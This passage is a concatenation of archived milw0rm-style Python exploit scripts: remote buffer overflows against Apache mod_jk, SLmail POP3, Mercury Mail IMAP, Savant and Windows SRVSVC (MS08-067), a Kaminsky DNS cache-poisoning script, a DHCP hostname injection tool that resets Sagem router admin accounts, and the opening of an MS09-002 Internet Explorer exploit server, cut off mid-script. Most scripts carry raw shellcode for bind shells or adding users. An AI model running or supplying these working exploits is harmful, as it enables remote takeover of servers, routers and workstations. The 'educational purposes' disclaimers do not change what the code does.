  sys.exit(-1)

def xpl():
  try:
    print len(buf)
    sockaddr = (host, 80)
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(sockaddr)
    payload = buf + 'HTTP/1.0\r\nHost: %s\r\n\r\n\0' % host
    s.send('GET /' + payload)
    s.close()
    print '  [+] connecting to %s ...\n' % host
    time.sleep(3)
    os.system("telnet %s 8888" % host)
  except:
    print '  [-] EXPLOIT FAILED!\n'

if __name__ == '__main__':
  print 'Apache (mod_jk) 1.2.19 Remote Stack Overflow Exploit (unohope [at] chroot.org)\n'
  try:
    host = sys.argv[1]
  except IndexError:
    usage()
  xpl()


# [NOTE]
#
# !! This is just for educational purposes, DO NOT use for illegal. !!
#

# milw0rm.com [2008-07-18]
from scapy import *
import random

# Copyright (C) 2008 Julien Desfossez <ju@klipix.org>
# http://www.solisproject.net/
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

# This script exploit the flaw discovered by Dan Kaminsky
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447
# http://www.kb.cert.org/vuls/id/800113

# It tries to insert a dummy record in the vulnerable DNS server by guessing
# the transaction ID.
# It also insert Authority record for a valid record of the target domain.

# To use this script, you have to discover the source port used by the vulnerable
# DNS server.
# Python is really slow, so it will take some time, but it works :-)


# IP to insert for our dummy record
targetip = "X.X.X.X"
# Vulnerable recursive DNS server
targetdns = "X.X.X.X"
# Authoritative NS for the target domain
srcdns = ["X.X.X.X"]

# Domain to play with
dummydomain = ""
basedomain = ".example.com."
# sub-domain to claim authority on
domain = "sub.example.com."
# Spoofed authoritative DNS for the sub-domain
spoof="ns.evil.com."
# src port of vulnerable DNS for recursive queries
dnsport = 32883

# base packet
rep = IP(dst=targetdns, src=srcdns[0])/ \
	UDP(sport=53, dport=dnsport)/ \
	DNS(id=99, qr=1, rd=1, ra=1, qdcount=1, ancount=1, nscount=1, arcount=0, 
		qd=DNSQR(qname=dummydomain, qtype=1, qclass=1), 
		an=DNSRR(rrname=dummydomain, ttl=70000, rdata=targetip, rdlen=4),
		ns=DNSRR(rrname=domain, rclass=1, ttl=70000, rdata=spoof, rdlen=len(spoof)+1, type=2)
	)


currentid = 1024
dummyid = 3
while 1:
	dummydomain = "a" + str(dummyid) + basedomain
	dummyid = dummyid + 1
	# request for our dummydomain
	req = IP(dst=targetdns)/ \
	      UDP(sport=random.randint(1025, 65000), dport=53)/ \
	      DNS(id=99, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
			      qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
			      an=0,
			      ns=0,
			      ar=0
		)
	send(req)

	# build the response
	rep.getlayer(DNS).qd.qname = dummydomain
	rep.getlayer(DNS).an.rrname = dummydomain

	for i in range(50):
		# TXID
		rep.getlayer(DNS).id = currentid
		currentid = currentid + 1
		if currentid == 65536:
			currentid = 1024

		# len and chksum
		rep.getlayer(UDP).len = IP(str(rep)).len-20
		rep[UDP].post_build(str(rep[UDP]), str(rep[UDP].payload))

		print "Sending our reply from %s with TXID = %s for %s" % (srcdns[0], str(rep.getlayer(DNS).id), dummydomain)
		send(rep, verbose=0)

	# check to see if it worked
	req = IP(dst=targetdns)/ \
	      UDP(sport=random.randint(1025, 65000), dport=53)/ \
	      DNS(id=99, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
			      qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
			      an=0,
			      ns=0,
			      ar=0
		)
	z = sr1(req, timeout=2, retry=0, verbose=0)
	try:
		if z[DNS].an.rdata == targetip:
			print "Successfully poisonned our target with a dummy record !!"
			break
	except:
		print "Poisonning failed"

# milw0rm.com [2008-07-24]
#########################################################
#                                                       #
# SLmail 5.5 POP3 PASS Buffer Overflow               	#
# Discovered by : Muts                                  #
# Coded by : Muts                                       #
# www.offsec.com                                        #
# Plain vanilla stack overflow in the PASS command  	#
#                                                       #
#########################################################
# D:\Projects\BO>SLmail-5.5-POP3-PASS.py                #
#########################################################
# D:\Projects\BO>nc -v 192.168.1.167 4444               #
# localhost.lan [192.168.1.167] 4444 (?) open           #   
# Microsoft Windows 2000 [Version 5.00.2195]            #
# (C) Copyright 1985-2000 Microsoft Corp.               #
# C:\Program Files\SLmail\System>                       #
#########################################################

import struct
import socket

print "\n\n###############################################"
print "\nSLmail 5.5 POP3 PASS Buffer Overflow"
print "\nFound & coded by muts [at] offsec.com"
print "\nFor Educational Purposes Only!" 
print "\n\n###############################################"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
sc += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
sc += "\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
sc += "\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
sc += "\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
sc += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
sc += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
sc += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
sc += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
sc += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
sc += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
sc += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
sc += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
sc += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
sc += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
sc += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
sc += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
sc += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
sc += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
sc += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
sc += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
sc += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
sc += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
sc += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
sc += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"

#Tested on Win2k SP4 Unpatched
# Change ret address if needed
buffer = '\x41' * 4654 + struct.pack('<L', 0x783d6ddf) + '\x90'*32 + sc 
try:
	print "\nSending evil buffer..."
	s.connect(('192.168.1.167',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone! Try connecting to port 4444 on victim machine."
except:
	print "Could not connect to POP3!"

# milw0rm.com [2004-11-18]
#!/usr/bin/env python
# 
#
#
# OOO OOO             OO                            OOO                                
#  O   O               O                           O   O
#  O   O               O                           O   O
#  O   O  OO OO    OOOOO   OOOOO  OOO OO  OOOOOO   O   O  OO OO    OOOOO
#  O   O   OO  O  O    O  O     O   OO  O O   O    O   O   OO  O  O     O
#  O   O   O   O  O    O  OOOOOOO   O        O     O   O   O   O  OOOOOOO
#  O   O   O   O  O    O  O         O       O      O   O   O   O  O
#  O   O   O   O  O    O  O     O   O      O   O   O   O   O   O  O     O
#   OOO   OOO OOO  OOOOOO  OOOOO  OOOOO   OOOOOO    OOO   OOO OOO  OOOOO                                                                                        
#
# 
# Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404) Remote CSRF Exploit (dhcp hostname attack)
#
# Discovery Date     : 13/09/2009
# Author             : Underz0ne Crew
#                      Zigma
# Author Of The Tool : Rafael Dominguez Vega
#
# First Of all Read this paper : http://www.mwrinfosecurity.com/publications/mwri_behind-enemy-lines_2008-07-25.pdf
#
# Description : Using DHCP as a method of attack, arbitrary and malicious scripting can be injected into the DHCP administrative and logs pages (if enabled). When the web administration toold is accessed, the code injection will execute with administrative privileges, which could lead to a complete compromise of the system.
# 
#  How To Exploit : 
# 
# Zigma@Underz0ne # python dhcpattack.py -i eth0 -t 192.168.1.1 -p "<IFRAME height=0 width=0 src='http://192.168.1.1/restoreinfo.cgi'></IFRAME>" 
#
# 0y]Z
# 
# Starting....
# .
# Sent 1 packets.
#
# Now When the Admin Enters to "Advanced Status" "DHCP" the CSRF Get's executed and the account get reseted , now u can simply access the web-based Administration Panel with : admin:admin  
# So Many Routers Suffers from dhcp hostname attack... 
# 
# 
#
#
#                         --/*/-----------------------------------------/*--
#
# This tool is distributed under a BSD licence. A copy of this 
# should have been included with this file.
#Copyright (c) 2008, Rafael Dominguez Vega
#
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
#    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#    * Neither the name of MWR InfoSecurity nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
#THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
#CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
#EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
#PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
#PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
#LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
#NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
#SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
# 
#
#Copyright (c) 2008, Rafael Dominguez Vega.
#
# This tool is designed for the purpose of performing security 
# testing only and is not intended to be used for unlawful 
# activities.
#
# This tool can be used to check for DHCP script injection vulnerabilities 
# in different sofware products.
#
# Required Libraries:
#scapy.py - "Packet generator/sniffer and network scanner/discovery"
#http://www.secdev.org/projects/scapy/
#
# Help can be viewed by running this file with --help. 
# 
#
# Author: Rafael Dominguez Vega
# Version: 0.0.2
#
# Further information: rafael ({dot}) dominguez-vega <(at)> mwrinfosecurity {(dot)} com
#

import optparse
from scapy import *
import socket
import fcntl
import struct
import os
import sys
import string
from optparse import OptionParser

class OptionParser (optparse.OptionParser):

    def check_required (self, opt):
        option = self.get_option(opt)

        if getattr(self.values, option.dest) is None:
            self.error("%s option not supplied" % option)

parser = OptionParser()
parser.add_option("-i", "--interface", action="store", dest="hwr",help="Network Interface (required)")
parser.add_option("-t", "--target", action="store", dest="server", help="DHCP Server IP address (required)")
parser.add_option("-p", "--hostname", action="store", dest="payload",  help="DHCP Hostname. Between double quotes (\"\") if special characters are used (required)")

(options, args) = parser.parse_args()

parser.check_required("-i")
if options.hwr:
    hwr = options.hwr
else:
    sys.exit(0)
    
parser.check_required("-t")
if options.server:
    server = options.server
else:
    sys.exit(0)
    
parser.check_required("-p")
if options.payload:
    payload = options.payload
else:
    sys.exit(0)
    

#Acknowledgement to Paul Cannon & Frank Millman for the following code chunk

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  
        struct.pack('256s', ifname[:15])
    )[20:24])

def getMacAddress():
    if sys.platform == 'win32':
        for line in os.popen("ipconfig /all"):
            if line.lstrip().startswith('Physical Address'):
                mac = line.split(':')[1].strip().replace('-',':')
                break
    else:
        for line in os.popen("/sbin/ifconfig"):
            if line.find('Ether') > -1:
                mac = line.split()[4]
                break
    return mac

# end of code chunk

srcmac = getMacAddress()
ip = get_ip_address(hwr)


macad = srcmac.split(":")

n0 = int(macad[0], 16)
n1 = int(macad[1], 16)
n2 = int(macad[2], 16)
n3 = int(macad[3], 16)
n4 = int(macad[4], 16)
n5 = int(macad[5], 16)

m0 = chr(n0)
m1 = chr(n1)
m2 = chr(n2)
m3 = chr(n3)
m4 = chr(n4)
m5 = chr(n5)

print(m0)
chmac = (m0+m1+m2+m3+m4+m5)

q = ip.split(".")

t0 = int(q[0])
t1 = int(q[1])
t2 = int(q[2])
t3 = int(q[3])

r0 = chr(t0)
r1 = chr(t1)
r2 = chr(t2)
r3 = chr(t3)

hexip = (r0+r1+r2+r3)

print chmac
print hexip

print("Starting....")

ether = Ether(src= srcmac,dst="ff:ff:ff:ff:ff:ff")
ip = IP(src="0.0.0.0",dst="255.255.255.255")
udp = UDP(sport=68,dport=67)
bootp = BOOTP(op="BOOTREQUEST", chaddr= chmac)
dhcp = DHCP(options=[('message-type',3),('hostname', payload),(50, hexip),("server_id", server),('param_req_list','pad'),('end'),('pad')])

discover_packet = ether/ip/udp/bootp/dhcp
sendp(discover_packet)

# milw0rm.com [2008-09-22]
                                                                                                                                                                                                                                                               
#########################################################
#                                                       #
# Mercury Mail 4.01 (Pegasus) IMAP Buffer Overflow     	#
# Discovered by : Muts                                  #
# Coded by : Muts                                       #
# WWW.WHITEHAT.CO.IL                                    #
# Plain vanilla stack overflow in the SELECT command  	#
#                                                       #
#########################################################


import struct
import socket
from time import sleep

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Lame calc.exe shellcode - dont expect miracles!

sc2 = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x29\x81\x73\x17\xb1\x74"
sc2 += "\x3f\x7c\x83\xeb\xfc\xe2\xf4\x4d\x9c\x69\x7c\xb1\x74\x6c\x29\xe7"
sc2 += "\x23\xb4\x10\x95\x6c\xb4\x39\x8d\xff\x6b\x79\xc9\x75\xd5\xf7\xfb"
sc2 += "\x6c\xb4\x26\x91\x75\xd4\x9f\x83\x3d\xb4\x48\x3a\x75\xd1\x4d\x4e"
sc2 += "\x88\x0e\xbc\x1d\x4c\xdf\x08\xb6\xb5\xf0\x71\xb0\xb3\xd4\x8e\x8a"
sc2 += "\x08\x1b\x68\xc4\x95\xb4\x26\x95\x75\xd4\x1a\x3a\x78\x74\xf7\xeb"
sc2 += "\x68\x3e\x97\x3a\x70\xb4\x7d\x59\x9f\x3d\x4d\x71\x2b\x61\x21\xea"
sc2 += "\xb6\x37\x7c\xef\x1e\x0f\x25\xd5\xff\x26\xf7\xea\x78\xb4\x27\xad"
sc2 += "\xff\x24\xf7\xea\x7c\x6c\x14\x3f\x3a\x31\x90\x4e\xa2\xb6\xbb\x5a"
sc2 += "\x6c\x6c\x14\x29\x8a\xb5\x72\x4e\xa2\xc0\xac\xe2\x1c\xcf\xf6\xb5"
sc2 += "\x2b\xc0\xaa\xdb\x74\xc0\xac\x4e\xa4\x55\x7c\x59\x95\xc0\x83\x4e"
sc2 += "\x17\x5e\x10\xd2\x5a\x5a\x04\xd4\x74\x3f\x7c"

#Change RET Address as needed
buffer = '\x41'*260 +  struct.pack('<L', 0x782f28f7)+ '\x90'*32+sc2

print "\nSending evil buffer..."
s.connect(('192.168.1.167',143))
s.send('a001 LOGIN ftp ftp' + '\r\n')
data = s.recv(1024)
sleep(3)
s.send('A001 SELECT ' + buffer+'\r\n')
data = s.recv(1024)
s.close()
print "\nDone! "

# milw0rm.com [2004-11-29]
#!/usr/bin/env python
#############################################################################
#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)
#   www.hackingspirits.com
#   www.coffeeandsecurity.com
#   Email: d3basis.m0hanty @ gmail.com
#############################################################################

import struct
import sys

from threading import Thread    #Thread is imported incase you would like to modify
                                #the src to run against multiple targets.

try:
    from impacket import smb
    from impacket import uuid
    from impacket.dcerpc import dcerpc
    from impacket.dcerpc import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)


print '#######################################################################'
print '#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)'
print '#   www.hackingspirits.com'
print '#   www.coffeeandsecurity.com'
print '#   Email: d3basis.m0hanty @ gmail.com'
print '#######################################################################\n'


#Portbind shellcode from metasploit; Binds port to TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe9"
shellcode += "\x4a\xb6\xa9\x83\xee\xfc\xe2\xf4\x15\x20\x5d\xe4\x01\xb3\x49\x56"
shellcode += "\x16\x2a\x3d\xc5\xcd\x6e\x3d\xec\xd5\xc1\xca\xac\x91\x4b\x59\x22"
shellcode += "\xa6\x52\x3d\xf6\xc9\x4b\x5d\xe0\x62\x7e\x3d\xa8\x07\x7b\x76\x30"
shellcode += "\x45\xce\x76\xdd\xee\x8b\x7c\xa4\xe8\x88\x5d\x5d\xd2\x1e\x92\x81"
shellcode += "\x9c\xaf\x3d\xf6\xcd\x4b\x5d\xcf\x62\x46\xfd\x22\xb6\x56\xb7\x42"
shellcode += "\xea\x66\x3d\x20\x85\x6e\xaa\xc8\x2a\x7b\x6d\xcd\x62\x09\x86\x22"
shellcode += "\xa9\x46\x3d\xd9\xf5\xe7\x3d\xe9\xe1\x14\xde\x27\xa7\x44\x5a\xf9"
shellcode += "\x16\x9c\xd0\xfa\x8f\x22\x85\x9b\x81\x3d\xc5\x9b\xb6\x1e\x49\x79"
shellcode += "\x81\x81\x5b\x55\xd2\x1a\x49\x7f\xb6\xc3\x53\xcf\x68\xa7\xbe\xab"
shellcode += "\xbc\x20\xb4\x56\x39\x22\x6f\xa0\x1c\xe7\xe1\x56\x3f\x19\xe5\xfa"
shellcode += "\xba\x19\xf5\xfa\xaa\x19\x49\x79\x8f\x22\xa7\xf5\x8f\x19\x3f\x48"
shellcode += "\x7c\x22\x12\xb3\x99\x8d\xe1\x56\x3f\x20\xa6\xf8\xbc\xb5\x66\xc1"
shellcode += "\x4d\xe7\x98\x40\xbe\xb5\x60\xfa\xbc\xb5\x66\xc1\x0c\x03\x30\xe0"
shellcode += "\xbe\xb5\x60\xf9\xbd\x1e\xe3\x56\x39\xd9\xde\x4e\x90\x8c\xcf\xfe"
shellcode += "\x16\x9c\xe3\x56\x39\x2c\xdc\xcd\x8f\x22\xd5\xc4\x60\xaf\xdc\xf9"
shellcode += "\xb0\x63\x7a\x20\x0e\x20\xf2\x20\x0b\x7b\x76\x5a\x43\xb4\xf4\x84"
shellcode += "\x17\x08\x9a\x3a\x64\x30\x8e\x02\x42\xe1\xde\xdb\x17\xf9\xa0\x56"
shellcode += "\x9c\x0e\x49\x7f\xb2\x1d\xe4\xf8\xb8\x1b\xdc\xa8\xb8\x1b\xe3\xf8"
shellcode += "\x16\x9a\xde\x04\x30\x4f\x78\xfa\x16\x9c\xdc\x56\x16\x7d\x49\x79"
shellcode += "\x62\x1d\x4a\x2a\x2d\x2e\x49\x7f\xbb\xb5\x66\xc1\x19\xc0\xb2\xf6"
shellcode += "\xba\xb5\x60\x56\x39\x4a\xb6\xa9"


#Payload for Windows 2000 target
payload_1='\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00'
payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41'
payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41'
payload_1+='\x41\x41'
payload_1+='\x2f\x68\x18\x00\x8b\xc4\x66\x05\x94\x04\x8b\x00\xff\xe0'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\xeb\xcc'
payload_1+='\x00\x00'

#Payload for Windows 2003[SP2] target
payload_2='\x41\x00\x5c\x00'
payload_2+='\x2e\x00\x2e\x00\x5c\x00\x2e\x00'
payload_2+='\x2e\x00\x5c\x00\x0a\x32\xbb\x77'
payload_2+='\x8b\xc4\x66\x05\x60\x04\x8b\x00'
payload_2+='\x50\xff\xd6\xff\xe0\x42\x84\xae'
payload_2+='\xbb\x77\xff\xff\xff\xff\x01\x00'
payload_2+='\x01\x00\x01\x00\x01\x00\x43\x43'
payload_2+='\x43\x43\x37\x48\xbb\x77\xf5\xff'
payload_2+='\xff\xff\xd1\x29\xbc\x77\xf4\x75'
payload_2+='\xbd\x77\x44\x44\x44\x44\x9e\xf5'
payload_2+='\xbb\x77\x54\x13\xbf\x77\x37\xc6'
payload_2+='\xba\x77\xf9\x75\xbd\x77\x00\x00'


if sys.argv[2]=='1':    #Windows 2000 Payload
    payload=payload_1
    print '[-]Windows 2000 payload loaded'
if sys.argv[2]=='2':    #Windows 2003[SP2] Payload
    payload=payload_2
    print '[-]Windows 2003[SP2] payload loaded'


class SRVSVC_Exploit(Thread):
    def __init__(self, target, osver, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port   = port
        self.target   = target
        self.osver   = osver

    def __DCEPacket(self):
        print '[-]Initiating connection'
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        
        # Constructing Malicious Packet
        self.__stub='\x01\x00\x00\x00'
        self.__stub+='\xd6\x00\x00\x00\x00\x00\x00\x00\xd6\x00\x00\x00'
        self.__stub+=shellcode
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x00\x00\x00\x00'
        self.__stub+='\x2f\x00\x00\x00\x00\x00\x00\x00\x2f\x00\x00\x00'
        self.__stub+=payload
        self.__stub+='\x00\x00\x00\x00'
        self.__stub+='\x02\x00\x00\x00\x02\x00\x00\x00'
        self.__stub+='\x00\x00\x00\x00\x02\x00\x00\x00'
        self.__stub+='\x5c\x00\x00\x00\x01\x00\x00\x00'
        self.__stub+='\x01\x00\x00\x00'
        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)   #0x1f (or 31)- NetPathCanonicalize Operation
        print '[-]Exploit sent to target successfully...\n[1]Telnet to port 4444 on target machine...'

if __name__ == '__main__':
       try:
               target = sys.argv[1]
               osver = sys.argv[2]
       except IndexError:
               print '\nUsage: %s <target ip> <os version>\n' % sys.argv[0]
               print 'Example: srvsvcexpl.py 192.168.1.1 2\n'
               print 'Select OS Version'
               print '[-]Windows 2000: OS Version = 1'
               print '[-]Windows 2003[SP2]: OS Version = 2'

               sys.exit(-1)

current = SRVSVC_Exploit(target, osver)
current.start()
#print '[-]Exploit sent to target successfully...\n[-]Telnet to port 4444 on target machine...'

# milw0rm.com [2008-11-16]
#########################################################
#                                                       #
# Savant web server Buffer Overflow Exploit             #
# Discovered by : Mati Aharoni                          #
# Coded by : Tal Zeltzer and Mati Aharoni               #
# www.see-security.com                                  #
# FOR RESEACRH PURPOSES ONLY!                           #
#########################################################
import struct
import socket
sc = "\x90" * 21
# win32_adduser - PASS=pwd EXITFUNC=thread USER=X Size=232 Encoder=PexFnstenvSub http://metasploit.com
sc += "\x31\xc9\x83\xe9\xcc\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
sc += "\x23\x73\xe4\x83\xeb\xfc\xe2\xf4\x24\xcb\x35\xe4\xd8\x23\xf8\xa1"
sc += "\xe4\xa8\x0f\xe1\xa0\x22\x9c\x6f\x97\x3b\xf8\xbb\xf8\x22\x98\x07"
sc += "\xf6\x6a\xf8\xd0\x53\x22\x9d\xd5\x18\xba\xdf\x60\x18\x57\x74\x25"
sc += "\x12\x2e\x72\x26\x33\xd7\x48\xb0\xfc\x27\x06\x07\x53\x7c\x57\xe5"
sc += "\x33\x45\xf8\xe8\x93\xa8\x2c\xf8\xd9\xc8\xf8\xf8\x53\x22\x98\x6d"
sc += "\x84\x07\x77\x27\xe9\xe3\x17\x6f\x98\x13\xf6\x24\xa0\x2c\xf8\xa4"
sc += "\xd4\xa8\x03\xf8\x75\xa8\x1b\xec\x31\x28\x73\xe4\xd8\xa8\x33\xd0"
sc += "\xdd\x5f\x73\xe4\xd8\xa8\x1b\xd8\x87\x12\x85\x84\x8e\xc8\x7e\x8c"
sc += "\x37\xed\x93\x84\xb0\xbb\x8d\x6e\xd6\x74\x8c\x03\x30\xcd\x8c\x1b"
sc += "\x27\x40\x1e\x80\xf6\x46\x0b\x81\xf8\x0c\x10\xc4\xb6\x46\x07\xc4"
sc += "\xad\x50\x16\x96\xf8\x7b\x53\x94\xaf\x47\x53\xcb\x99\x67\x37\xc4"
sc += "\xfe\x05\x53\x8a\xbd\x57\x53\x88\xb7\x40\x12\x88\xbf\x51\x1c\x91"
sc += "\xa8\x03\x32\x80\xb5\x4a\x1d\x8d\xab\x57\x01\x85\xac\x4c\x01\x97"
sc += "\xf8\x7b\x53\xcb\x99\x67\x37\xe4";
sc += "AA"
# Win2k SP0,1,2,3,4
#Change Return address as needed
buf = "\xEB\x19" + " /" + sc + struct.pack("<L",0x750236b2) + "\r\n\r\n"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',80))
s.send(buf)
s.close()

# milw0rm.com [2005-02-01]
#!/usr/bin/env python
###############################################################################
# MS Internet Explorer 7 Memory Corruption Exploit (MS09-002)    	      #				 		 				 				    
###############################################################################
#									      #
# Thanks to str0ke for finding this in the wild.			      #
#				 				 	      #
# Tested on Windows 2003 SP2 R2 				 	      #
#				 				 	      #
# Written by SecureState R&D Team (ReL1K)			 	      #
# http://www.securestate.com				 		      #
#									      #
# win32_bind EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai Shell=bind #
#									      #
###############################################################################
from BaseHTTPServer import HTTPServer
from BaseHTTPServer import BaseHTTPRequestHandler
import sys
try:
  import psyco
  psyco.full()
except ImportError:
   pass
class myRequestHandler(BaseHTTPRequestHandler):
 try:
  def do_GET(self):
    # Always Accept GET
    self.printCustomHTTPResponse(200)
    # Site root: Main Menu
    if self.path == "/":
       target=self.client_address[0]
       self.wfile.write("""<html><head>""")
       self.wfile.write("""<div id="replace">x</div>
<script language="JavaScript">

//  win32_bind -  EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai http://metasploit.com */
